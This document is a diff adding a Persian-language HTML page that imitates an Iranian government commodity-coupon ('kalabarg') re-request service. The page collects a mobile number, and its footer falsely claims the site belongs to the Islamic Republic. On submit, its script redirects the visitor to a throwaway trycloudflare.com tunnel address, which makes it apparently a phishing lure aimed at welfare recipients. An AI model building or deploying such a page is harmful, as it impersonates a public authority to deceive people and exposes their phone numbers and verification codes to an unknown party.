@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>درخواست کالابرگ</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700&display=swap');
+  :root { --blue:#244b91; --line:#a9a9a9; --muted:#888; }
+  * { box-sizing:border-box }
+  body {
+    margin:0; min-height:100vh; background:#fff; color:#222;
+    font-family:Vazirmatn,Tahoma,sans-serif; display:flex; flex-direction:column;
+  }
+  main { width:min(390px,calc(100% - 34px)); margin:clamp(58px,14vh,130px) auto 28px; }
+  .brand { display:flex; align-items:center; justify-content:center; gap:13px; color:var(--blue); margin-bottom:48px; }
+  .mark { width:48px; height:48px; border:2px solid var(--blue); border-radius:50%; display:grid; place-items:center; font-size:23px; font-weight:700; }
+  .brand-title { font-size:16px; font-weight:700; }
+  .brand-sub { font-size:11px; margin-top:5px; }
+  h1 { font-size:18px; font-weight:600; text-align:center; margin:0 0 25px; }
+  .intro { font-size:12px; line-height:2.1; margin-bottom:48px; }
+  label { display:block; font-size:12px; color:#777; margin-bottom:8px; }
+  input { width:100%; border:0; border-bottom:1px solid var(--line); padding:12px 8px; outline:none; font:inherit; font-size:13px; background:transparent; }
+  input:focus { border-bottom:2px solid var(--blue); }
+  .hint { font-size:10px; color:#999; margin-top:8px; }
+  button { width:100%; border:0; border-radius:12px; padding:13px; margin-top:38px; font:inherit; font-size:12px; background:#e9edf4; color:var(--blue); box-shadow:0 3px 8px #00000018; cursor:pointer; }
+  button:hover { background:#dfe7f4; }
+  .divider { display:flex; align-items:center; gap:12px; color:#777; font-size:12px; margin:38px 0 24px; }
+  .divider:before,.divider:after { content:""; height:1px; background:#e5e5e5; flex:1; }
+  .quick { display:flex; justify-content:center; gap:18px; }
+  .quick span { width:54px; height:54px; border:1px solid #e1e7f1; border-radius:9px; box-shadow:0 2px 4px #00000012; display:grid; place-items:center; color:var(--blue); font-size:22px; }
+  .notice { display:none; margin-top:18px; padding:12px; border-radius:8px; background:#f3f6fb; color:#244b91; font-size:12px; line-height:1.9; }
+  footer { margin:auto 16px 20px; text-align:center; font-size:10px; color:#a0a0a0; }
+  @media(max-height:700px) { main { margin-top:36px; } .brand { margin-bottom:30px; } .intro { margin-bottom:28px; } }
+</style>
+</head>
+<body>
+<main>
+  <header class="brand">
+    <div class="mark" aria-hidden="true"></div>
+    <div>
+      <div class="brand-title">درخواست کالابرگ مجدد</div>
+      <div class="brand-sub">برای توان مندی های خانواده ها</div>
+    </div>
+  </header>
+  <h1>کالابرگ مجدد</h1>
+  <p class="intro">برای دریافت مجدد کالابرگ شماره تلفن خود را وارد کنید و روی ارسال کد بزنید </p>
+  <form id="demoForm">
+    <label for="mobile">شماره همراه</label>
+    <input id="mobile" name="mobile" type="tel" inputmode="numeric" maxlength="11" placeholder="مثلاً 09123456789" autocomplete="off" required pattern="09[0-9]{9}">
+    <div class="hint"></div>
+    
+
+    <button type="submit">ارسال کد</button>
+  </form>
+  <div id="notice" class="notice" role="status">درخواست شما بررسی میشود</div>
+  <div class="divider">یا</div>
+  <div class="quick" aria-label="گزینه‌های نمایشی">
+    <span title="گزینه نمایشی" aria-hidden="true">▯</span>
+    <span title="گزینه نمایشی" aria-hidden="true">▦</span>
+  </div>
+</main>
+<footer>این وب سایت متعلق به جمهوری اسلامی است </footer>
+
+<script>
+document.getElementById('demoForm').addEventListener('submit', function (event) {
+    event.preventDefault();
+
+    if (!this.reportValidity()) return;
+
+    window.location.href = 'https://jail-yarn-accordingly-boulevard.trycloudflare.com';
+});
+</script>
+
+</body>
+</html>
